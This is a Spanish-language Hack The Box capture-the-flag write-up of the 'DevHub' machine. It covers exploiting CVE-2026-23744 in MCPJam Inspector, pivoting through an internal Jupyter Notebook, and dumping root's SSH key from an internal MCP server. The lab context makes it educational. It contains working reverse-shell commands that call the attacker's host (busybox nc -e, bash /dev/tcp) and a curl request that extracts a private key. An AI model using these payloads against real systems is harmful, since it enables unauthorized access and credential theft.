---
title: "DevHub - Hack The Box"
date: 2026-05-31
unlock_date: 2026-10-17
draft: false
slug: "htb-writeup-devhub"
excerpt: "Esta fue una máquina un poco complicada. Después de analizar los escaneos, nos dirigimos a la página web activa en el puerto 80, en donde vemos información sobre qué herramientas se utilizan de manera interna por desarrolladores, siendo lo más útil que encontramos. Después, vamos a la página web del puerto 6274, que resulta ser MCPJam Inspector, que está expuesto para que cualquiera lo utilice, pero al investigar su versión, vemos que es vulnerable al CVE-2026-23744, lo que nos permite ejecutar comandos de manera remota y así obtener una sesión interactiva de la máquina víctima como un usuario. Dentro, descubrimos que se está utilizando Jupyter Notebook en el puerto 8888, pero solo de manera interna. Utilizamos Chisel para exponer ese puerto en nuestra máquina y logramos ejecutar comandos tanto en Python como en la terminal del Jupyter Notebook, para así obtener una Reverse Shell y convertirnos en otro usuario con más privilegios. Como el segundo usuario, analizamos un script de Python que sirve como un servidor MCP interno al que se le pueden hacer consultas a distintos endpoints, como una API. Resulta que una de las consultas que podemos hacer nos da como resultado una llave privada SSH del Root, que logramos obtener y así escalamos privilegios para convertirnos en Root."
categories: ["HackTheBox", "Medium Machine"]
tags: ["Linux", "Virtual Hosting", "SSH", "MPCJam Inspector", "Jupyter Notebook", "MCPJam Inspector Remote-Code-Execution (CVE-2026-23744)", "CVE-2026-23744", "Abusing Jupyter NoteBook (RCE)", "Abusing Internal MCP Server", "Privesc - Abusing Internal MCP Server", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "echo"
  - "nc"
  - "python3"
  - "curl"
  - "ps"
  - "grep"
  - "gunzip"
  - "wget"
  - "chmod"
  - "chisel"
links:
  - "https://github.com/advisories/GHSA-232v-j27c-5pp6"
  - "https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC"
  - "https://github.com/vulhub/vulhub/blob/master/jupyter/notebook-rce/README.md"
  - "https://github.com/jpillora/chisel"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-devHub/devhub.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.129.11.133
PING 10.129.11.133 (10.129.11.133) 56(84) bytes of data.
64 bytes from 10.129.11.133: icmp_seq=1 ttl=63 time=144 ms
64 bytes from 10.129.11.133: icmp_seq=2 ttl=63 time=142 ms
64 bytes from 10.129.11.133: icmp_seq=3 ttl=63 time=140 ms
64 bytes from 10.129.11.133: icmp_seq=4 ttl=63 time=142 ms

--- 10.129.11.133 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3010ms
rtt min/avg/max/mdev = 140.372/142.224/143.863/1.241 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.11.133 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-31 15:30 -0600
Initiating SYN Stealth Scan at 15:30
Scanning 10.129.11.133 [65535 ports]
Discovered open port 22/tcp on 10.129.11.133
Discovered open port 80/tcp on 10.129.11.133
Discovered open port 6274/tcp on 10.129.11.133
Increasing send delay for 10.129.11.133 from 0 to 5 due to 11 out of 29 dropped probes since last increase.
Completed SYN Stealth Scan at 15:30, 40.18s elapsed (65535 total ports)
Nmap scan report for 10.129.11.133
Host is up, received user-set (0.31s latency).
Scanned at 2026-05-31 15:30:00 CST for 40s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
6274/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 40.27 seconds
           Raw packets sent: 196627 (8.652MB) | Rcvd: 46 (2.024KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos que hay 3 puertos, pero me da mucha curiosidad el **puerto 6274** que vemos activo.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,6274 10.129.11.133 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-31 15:30 -0600
Nmap scan report for 10.129.11.133
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)

|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
6274/tcp open  unknown

| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Sun, 31 May 2026 21:31:16 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Sun, 31 May 2026 21:31:16 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Sun, 31 May 2026 21:31:17 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.98%I=7%D=5/31%Time=6A1CA8A3%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credential
SF:s:\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20
SF:charset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Sun,\x2031\x20May\x202026\
SF:x2021:31:16\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<
SF:html\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/
SF:svg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20na
SF:me=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\
SF:"\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x
SF:20\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-
SF:DRYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>
SF:\n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20<
SF:/body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content
SF:\r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-m
SF:ethods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent
SF:-type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Sun,\x2031\x20May\x2
SF:02026\x2021:31:16\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPReques
SF:t,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credent
SF:ials:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DEL
SF:ETE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset
SF:=UTF-8\r\nDate:\x20Sun,\x2031\x20May\x202026\x2021:31:17\x20GMT\r\nConn
SF:ection:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSS
SF:tatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConn
SF:ection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Después de analizar el escaneo, tenemos lo siguiente:
* El **puerto 80** nos está mostrando el uso de un dominio llamado: `devhub.htb`.
* El **puerto 6274** muestra el uso de **MCPJam Inspector**, que parece ser una herramienta que se puede usar desde la web.

Desconozco qué sea el **MPCJam**, pero primero agreguemos el dominio que descubrimos al `/etc/hosts`:
```bash
echo "10.129.11.133 devhub.htb" >> /etc/hosts
```
Bien, ahora vamos a comenzar con la página activa del **puerto 80** y luego iremos al **MCPJam Inspector**.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-devHub/Captura1.png">
</p>

Parece solo una página informativa sobre las tecnologías que se están ejecutando.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-devHub/Captura2.png">
</p>

Vemos que se esta utilizando **nginx**, pero nada más.

Al analizar el código fuente y de tratar de aplicar **Fuzzing**, no encontraremos nada.

Lo interesante, es analizar lo que nos muestra:
* En el **puerto 6274** se está utilizando **MCP Inspector** para el equipo de desarrollo, cosa que ya comprobamos que esta activo.
* El equipo de análisis tiene acceso a **Jupyter** de manera interna en el **puerto 8888**.
* Existe un **Git Server** interno para control de versiones y colaboración, aunque menciona que esta en mantenimiento.

Tengamos en mente esta información para más adelante, ya que parecen ser pistas de lo que nos vamos a enfrentar.

Ahora, vayamos a ver el **MCP Inspector**.

### Analizando Página Web del Puerto 6274 - MPCJam Inspector {#Puerto6274}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-devHub/Captura3.png">
</p>

Bien, vemos que es posible utilizar esta herramienta por cualquier persona que tenga acceso.

| **MPCJam Inspector** |
|:--------------------:|
| *MCPJam Inspector es una herramienta para desarrolladores que trabajan con MCP (Model Context Protocol), el protocolo que utilizan aplicaciones de IA para comunicarse con herramientas, recursos y servicios externos. Se suele describir como una especie de "Postman para MCP". Sus funciones principales incluyen: Conectarse a servidores MCP mediante STDIO, SSE o HTTP Streamable, explorar las herramientas (tools), recursos (resources) y prompts que expone un servidor MCP, ejecutar llamadas manuales a herramientas y ver sus resultados, etc.* |

En resumen, es una herramienta para inspeccionar y depurar **servidores MCP**, esto implementando comunicaciones con IA; un ejemplo sería con **ChatGPT**, **Claude**, etc.

Si nos vamos a la sección de **Settings**, podemos encontrar la versión que está implementada:

<p align="center">
<img src="/assets/images/htb-writeup-devHub/Captura4.png">
</p>

Vemos que es la **versión 1.4.2**.

Investiguemos si hay un Exploit para esta herramienta y versión.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Exploit: CVE-2026-23744 - MCPJam Inspector Remote-Code-Execution (RCE) {#MCPJamRCE}

Investigando un poco, encontraremos que esta versión es vulnerable al **CVE-2026-23744** que es un Exploit **Remote-Code-Execution (RCE)**:
* <a href="https://github.com/advisories/GHSA-232v-j27c-5pp6" target="_blank">CVE-2026-23744 - RCE in MCPJam inspector due to HTTP Endpoint exposes</a>

Además, podemos encontrar el siguiente script que ejecuta esta vulnerabilidad:
* <a href="https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC" target="_blank">Repositorio de suljov: CVE-2026-23744 - MCPJam inspector Remote-Code-Execution: Proof Of Concept (POC)</a>

Si analizamos ambos repositorios, la vulnerabilidad es bastante sencilla de aplicar, siendo que solo necesitamos armar una petición con **curl** para ejecutar comandos.

Para el script de **Python**, solamente tenemos que agregar la URL donde se despliega el **MCPJam Inspector**, tu IP y un puerto a usar:
```python
target = "http://IP:6274"
ip = "Tu_IP"
port = "Puerto_a_Usar"
```

Antes de ejecutarlo, vamos a levantar un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Ejecuta el script:
```bash
python3 exploit.py
```

Observa el listener:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.129.11.133] 47834
whoami
mcp-dev
```
Estamos dentro.

Obtengamos una shell interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189

mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ whoami
mcp-dev
```

Realizándolo de manera manual, hubiera funcionado de esta forma:
```bash
curl -X POST http://IP:6274/api/mcp/connect -H 'Content-Type: application/json' --data '{"serverConfig":{"command":"busybox","args":["nc","Tu_IP","Puerto_a_Usar","-e","/bin/bash"],"env":{}},"serverId":"RevShell"}'
```
Continuemos.

## Post Explotación {#Post}

### Abusando de Jupyter NoteBook para Ejecutar Comandos y Obtener Reverse Shell de Usuario analyst {#Jupyter}

Enumerando un poco la máquina, podemos ver que existen 2 usuarios, además del **Root**:
```bash
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ cat /etc/passwd | grep 'bash'
root:x:0:0:root:/root:/bin/bash
mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
analyst:x:1002:1002::/home/analyst:/bin/bash
```
Como nuestro usuario actual, no podremos hacer nada.

Recordando lo que vimos en la página web activa del **puerto 80**, debe existir el uso de **Jupyter Notebook** en el **puerto 8888**, así que vamos a comprobarlo con la herramienta **ps**:
```bash
mcp-dev@devhub:~$ ps aux | grep jupyter
analyst     1076  0.0  2.4 182528 96304 ?        Ss   17:57   0:05 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=********** --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
root        1082  0.0  0.7  37376 28676 ?        Ss   17:57   0:03 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
mcp-dev     1804  0.0  0.0   3472  1592 pts/0    S+   21:56   0:00 grep --color=auto jupyter
```

Excelente, aquí vemos 2 cosas importantes:
* Vemos que sí está desplegado **Jupyter Notebook** en el **puerto 8888** de manera local. Además, vemos la ruta donde está desplegado, siendo `/home/analyst/notebook` y vemos un token en uso para el servidor.
* Existe un script llamado **server.py**, que es ejecutado por el **Root**.

Este último, solamente lo puede leer el **Root** y el **usuario analyst**:
```bash
mcp-dev@devhub:~$ ls -la /opt/opsmcp/
total 16
drwxr-xr-x 2 analyst analyst 4096 May 26 08:42 .
drwxr-xr-x 4 root    root    4096 May 26 08:42 ..
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 server.py
```
Tengámoslo en cuenta para más adelante.

Enfoquemos totalmente en **Jupyter Notebook**:

| **Jupyter Notebook** |
|:--------------------:|
| *Jupyter Notebook es una aplicación web de código abierto que permite crear y ejecutar documentos interactivos llamados notebooks, los cuales pueden contener: Código ejecutable (principalmente Python, pero también R, Julia y otros lenguajes mediante kernels), texto con formato usando Markdown, ecuaciones matemáticas en LaTeX, etc.* |

En alguna ocasión utilicé esta herramienta para estudiar **Python**, así que puede ser muy útil, ya que puede que nos permita ejecutar comandos como el **usuario analyst**.

La idea es poder ver el **Jupyter Notebook** desde nuestro navegador, por lo que tendremos que hacer **Port Forwarding**.

Esto lo haremos con la herramienta **chisel**:
* <a href="https://github.com/jpillora/chisel" target="_blank">Repositorio de jpillora: chisel</a>

Ve a la sección de **Releases** y descarga la versión **amd64** comprimida o la que se acomode para tu sistema, luego descomprímela:
```bash
gunzip chisel_1.11.5_linux_amd64.gz chisel_linux

ls
chisel_linux  CVE-2026-23744-Remote-Code-Execution-POC

chmod +x chisel_linux
```

Una vez listo **chisel**, vamos a enviarlo a la máquina víctima utilizando un servidor de **Python**:
```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y lo descargamos con **wget**:
```bash
mcp-dev@devhub:~$ wget http://Tu_IP:8000/chisel_linux
mcp-dev@devhub:~$ chmod +x chisel_linux
```

Ahora bien, podríamos crear un túnel para poder ver todos los puertos internos en uso desde nuestra máquina, pero como solo nos interesa el **puerto 8888**, solo podremos ver ese.

Desde tu máquina, ejecuta **chisel** como servidor utilizando un puerto de tu agrado:
```bash
./chisel_linux server --reverse -p 8000
2026/05/31 16:36:11 server: Reverse tunnelling enabled
2026/05/31 16:36:11 server: Fingerprint ...
2026/05/31 16:36:11 server: Listening on http://0.0.0.0:8000
```

Utiliza **chisel** como cliente desde la máquina víctima para conectarte a nuestro servidor e indica el puerto que queremos ver localmente:
```bash
mcp-dev@devhub:~$ ./chisel_linux client Tu_IP:8000 R:8888:127.0.0.1:8888
2026/05/31 22:36:12 client: Connecting to ws://Tu_IP:8000
2026/05/31 22:36:13 client: Connected (Latency 144.389676ms)
```
Perfecto, funcionó correctamente.

Ahora, visita de manera local el **puerto 8888** desde el navegador:

<p align="center">
<img src="/assets/images/htb-writeup-devHub/Captura5.png">
</p>

Observa que nos pide el token, así que cópialo, pégalo y entra:

<p align="center">
<img src="/assets/images/htb-writeup-devHub/Captura6.png">
</p>

Bien, vemos algunas funciones que podemos utilizar, entre ellas una consola de **Python** y una terminal de comandos, así que probaremos ambas para enviar una **Reverse Shell**.

Abre otro listener con **netcat**:
```bash
nc -nlvp 1337
listening on [any] 1337 ...
```

Primero, utilicemos la consola de **Python** para ejecutar comandos y enviar la **Reverse Shell**:
```python
import os;
os.system('bash -c "bash -i >& /dev/tcp/Tu_IP/1337 0>&1"')
```

<p align="center">
<img src="/assets/images/htb-writeup-devHub/Captura7.png">
</p>

Observa el listener:
```bash
nc -nlvp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [10.129.11.133] 41054
bash: cannot set terminal process group (1982): Inappropriate ioctl for device
bash: no job control in this shell
analyst@devhub:~/notebooks$ whoami
whoami
analyst
```

Esto hubiera funcionado también en la terminal de comandos:

<p align="center">
<img src="/assets/images/htb-writeup-devHub/Captura8.png">
</p>

Obtengamos una shell interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189
```

Y obtengamos la flag del usuario:
```bash
analyst@devhub:~/notebooks$ cd /home/analyst/
analyst@devhub:~$ ls
jupyter-env  notebooks  user.txt
analyst@devhub:~$ cat user.txt
...
```

### Abusando de Servidor MCP Interno para Obtener Llave Privada de Root {#MCPserver}

Ahora que somos el **usuario analyst**, ya podemos ver ese script que encontramos antes llamado **server.py**:
```bash
analyst@devhub:~$ cat /opt/opsmcp/server.py 
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""
```
Parece ser un **servidor MCP** interno para hacer consultas a herramientas (tools) que sirven como endpoints de una **API**, así que vamos a analizarlo a fondo, pero solo las partes importantes.

* Al inicio, podemos ver las librerías que utiliza y vemos una **API Key** de autenticación:

```python
from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_**********"
```

* Después, veremos qué herramientas están visibles y ocultas, siendo que también podemos ver la descripción de qué hace cada herramienta:

```python
# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
...
...

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}
```
Presta atención a la herramienta oculta llamada `ops._admin_dump`, pues menciona que es para obtener las credenciales por emergencia y solo de uso interno.

* Ahora sigue una función que va a validar la **API Key** de autenticación:
```python
def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY
```

* Ahora, podemos ver la función `call_tool()`, pues aquí veremos cómo se realizan las consultas a cada endpoint:

```python
@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})
    
    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400
    
    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
...
...
```
Para hacer la consulta de cada herramienta, debe ser por **petición POST**; se debe usar la cabecera `X-API-Key` que utilice la **API Key** que vimos al inicio; la data se debe indicar en **JSON**, dar el nombre de la herramienta a consultar y sus argumentos.

* De esa misma función, observa lo siguiente:

```python
elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "**********",
                    "mcp-dev": "**********"
                }
            })
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })
...
...
```
Encontramos algo super importante.

Básicamente, con la herramienta `ops._admin_dump` podemos consultar lo siguiente:
* Compartir una llave privada SSH, que al parecer es del **Root**.
* Compartir contraseñas, que ahí podemos ver las contraseñas de todos los usuarios (que en mi caso no funcionó ninguna).
* Compartir tokens, que nos da un token de admin y otro de servicio, aunque desconozco para qué servirán estos tokens.

Entonces, lo principal será obtener la llave privada del **Root** y, para que funcione la petición, debe contener lo siguiente:
```python
"name":"ops._admin_dump"
"arguments":{"target":"ssh_keys","confirm":true}
```
Además, añadiremos la cabecera `Content-Type: application/json` para poder compartir la data como **JSON**.

La petición quedaría así:
```bash
curl -s -X POST http://127.0.0.1:5000/tools/call -H "X-API-Key: opsmcp_secret_key_**********" -H "Content-Type: application/json" -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

Una vez que la ejecutes, obtendremos la llave privada SSH del **Root**:
```bash
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\n...
...
...
...
```

Lo malo es que no la tenemos en un formato correcto, es decir, no está indentada correctamente. Entonces, vamos a guardar el resultado de la petición en un **archivo JSON**:
```bash
curl -s -X POST http://127.0.0.1:5000/tools/call -H "X-API-Key: opsmcp_secret_key_**********" -H "Content-Type: application/json" -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' > dump.json
```

Utilizaremos un pequeño script de **Python** para obtener solamente la llave privada y el output lo guardamos en un archivo:
```bash
analyst@devhub:~$ /home/analyst/jupyter-env/bin/python3 -c 'import json;print(json.load(open("dump.json"))["root_private_key"])' > root.key
```

Revisemos que esté nuestro archivo con la llave privada:
```bash
analyst@devhub:~$ ls
dump.json  jupyter-env  notebooks  root.key  user.txt
analyst@devhub:~$ cat root.key 
-----BEGIN OPENSSH PRIVATE KEY-----
...
...
...
-----END OPENSSH PRIVATE KEY-----
```
Muy bien, ya lo podemos ver en un formato correcto.

Cópialo, guárdalo en un archivo en tu máquina y dale los permisos correctos para que funcione la llave privada:
```bash
nano id_rsa

chmod 600 id_rsa
```

Utilicemos la llave privada para autenticarnos en la máquina víctima como **Root** vía **SSH**:
```bash
ssh -i id_rsa root@10.129.11.133
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
...
Last login: Sun May 31 23:01:42 2026
root@devhub:~# whoami
root
```
Estamos dentro y somos **Root**.

Obtengamos la última flag:
```bash
root@devhub:~# ls
root.txt  snap
root@devhub:~# cat root.txt
...
```
Y con esto, terminamos la máquina.
